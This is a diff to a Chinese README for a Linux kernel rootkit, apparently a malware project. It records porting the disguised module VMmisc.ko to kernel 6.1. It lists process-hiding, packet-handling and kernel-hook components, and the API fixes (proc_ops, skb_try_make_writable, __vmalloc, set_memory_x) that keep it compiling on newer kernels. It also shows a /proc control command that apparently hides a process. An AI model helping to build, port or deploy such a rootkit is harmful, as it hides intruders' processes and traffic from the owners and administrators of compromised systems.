@@ -19,13 +19,22 @@
 ## 系统兼容性
 
 ### 支持的内核版本
-- Linux Kernel 2.6/3.x/4.x
+- **原始支持**: Linux Kernel 2.6.32-358.el6.x86_64 (CentOS 6)
+- **最新适配**: Linux Kernel 6.1.0-35-amd64 (Debian 12)
+- **兼容范围**: Linux Kernel 2.6.x - 6.x
 - 支持x32与x64系统
 
 ### 支持的操作系统
 - Redhat, CentOS, Debian, Fedora, Ubuntu等Linux系统
-- 已测试: CENTOS 5.5 - 8 (kernel 5.18)
+- **已测试**: CENTOS 5.5 - 8 (kernel 5.18)
+- **最新测试**: Debian 12 (kernel 6.1.0-35-amd64)
 - Ubuntu支持到kernel 5.14
+
+### 最新适配状态 (2025年08月12日)
+✅ **成功适配**: Linux 6.1.0-35-amd64内核  
+✅ **编译环境**: Debian 12 + GCC 12.2.0  
+✅ **内核头文件**: linux-headers-6.1.0-35-amd64  
+✅ **生成文件**: VMmisc.ko (812KB, vermagic=6.1.0-35-amd64)
 
 ## 项目结构
 
@@ -39,6 +48,11 @@ rksrc_20230201/
 ├── kofile/                   # 内核模块源码
 │   ├── main.c               # 主模块文件
 │   ├── config.h              # 配置文件
+│   ├── rproc.h              # 进程隐藏模块
+│   ├── rpkt.h               # 网络包处理模块
+│   ├── rhook.h              # 内核钩子模块
+│   ├── rmod.h               # 模块管理
+│   ├── util.h               # 工具函数
 │   └── ...                  # 其他模块文件
 ├── install/                  # 安装脚本
 │   ├── install.sh           # 安装脚本
@@ -48,6 +62,51 @@ rksrc_20230201/
 ├── .tmp_versions/           # 临时版本文件
 └── Makefile                  # 编译配置文件
 ```
+
+## 最新修改内容 (2025年08月12日)
+
+### 🔧 内核兼容性修复
+本次更新主要针对Linux 6.1.0内核进行了全面的兼容性适配，解决了以下关键问题：
+
+#### 1. 头文件兼容性问题
+- **移除vermagic.h**: 该头文件只能在内核模块编译时使用，在源码中包含会导致编译错误
+- **添加版本检测**: 在config.h中添加了`#include <linux/version.h>`
+- **修复UTS_RELEASE**: 添加了`#include <linux/utsname.h>`并定义了兼容性宏
+
+#### 2. API兼容性修复
+- **proc_create函数**: 修复了从`file_operations`到`proc_ops`的参数类型变化
+  - 为新内核(5.6+)创建了`proc_path_proc_ops`结构
+  - 保持了向后兼容性(3.9+使用file_operations)
+- **skb_make_writable函数**: 在新内核(5.2+)中改为`skb_try_make_writable`
+- **__vmalloc函数**: 修复了参数数量变化(新内核只接受2个参数)
+- **fcheck_files函数**: 在新内核(5.0+)中改为`files_lookup_fd_rcu`
+
+#### 3. 类型兼容性修复
+- **filldir_t类型**: 修复了从`int`返回类型改为`bool`的兼容性问题
+- **set_memory_x_t**: 重新定义了函数指针类型，避免`typeof`编译错误
+- **ptr_mem_x变量**: 修复了未定义符号的链接错误
+
+#### 4. 条件编译优化
+- 添加了`#if LINUX_VERSION_CODE >= KERNEL_VERSION(x,x,x)`的条件编译
+- 为不同内核版本提供了不同的实现路径
+- 确保了从Linux 2.6.x到6.x的广泛兼容性
+
+### 📁 修改的文件列表
+```
+kofile/config.h      - 添加内核版本兼容性定义和宏
+kofile/main.c        - 移除vermagic.h包含
+kofile/rproc.h       - 修复filldir_t类型兼容性
+kofile/rpkt.h        - 修复skb_make_writable和fcheck_files兼容性
+kofile/rhook.h       - 修复__vmalloc参数和UTS_RELEASE问题
+kofile/rmod.h        - 修复proc_create兼容性
+kofile/util.h        - 修复set_memory_x_t定义和函数调用
+```
+
+### 🎯 编译环境要求
+- **GCC版本**: 12.2.0+ (支持C99标准)
+- **内核头文件**: 与目标内核版本完全匹配
+- **Make工具**: 支持内核模块编译
+- **系统环境**: 建议使用系统自带的开发包，避免版本不匹配
 
 ## 系统要求
 
@@ -92,7 +151,7 @@ yum install "kernel-devel-uname-r == $(uname -r)"
 apt-cache search linux-headers-*
 
 # 安装指定版本
-apt-get install linux-headers-3.10.0-10
+apt-get install linux-headers-$(uname -r)
 ```
 
 ## 编译安装
@@ -244,7 +303,8 @@ echo "-p666" > /proc/VMmisc
 ### 兼容性改进
 - 兼容CENTOS 5.6.7 (必要)，8(非必要)
 - Ubuntu (16-22) 兼容越多越好(暂时非必要)
-- 已测试: CENTOS 5.5 - 8 (kernel 5.18)
+- **已测试**: CENTOS 5.5 - 8 (kernel 5.18)
+- **最新测试**: Debian 12 (kernel 6.1.0-35-amd64) ✅
 - Ubuntu支持到kernel 5.14
 
 ## 故障排除
@@ -268,6 +328,13 @@ uname -r
 # 安装对应版本的内核开发包
 yum install "kernel-devel-uname-r == $(uname -r)"
 ```
+
+### 编译错误排查
+如果遇到编译错误，请检查：
+1. **内核头文件版本**: 确保与运行内核版本匹配
+2. **GCC版本**: 建议使用系统自带的GCC版本
+3. **依赖包**: 确保所有必要的开发包已安装
+4. **权限设置**: 确保源码目录有正确的读写权限
 
 ## 卸载说明
 
@@ -328,7 +395,8 @@ rm -rf /etc/systemd/system/xxxx.service
 
 ---
 
-**最后更新**: 2023年2月1日  
-**版本**: 1.0  
+**最后更新**: 2025年08月12日  
+**版本**: 2.0  
 **技术类型**: Rootkit内核级隐藏技术  
-**适用场景**: 系统管理、安全测试、取证研究
+**适用场景**: 系统管理、安全测试、取证研究  
+**最新适配**: Linux 6.1.0-35-amd64内核 ✅
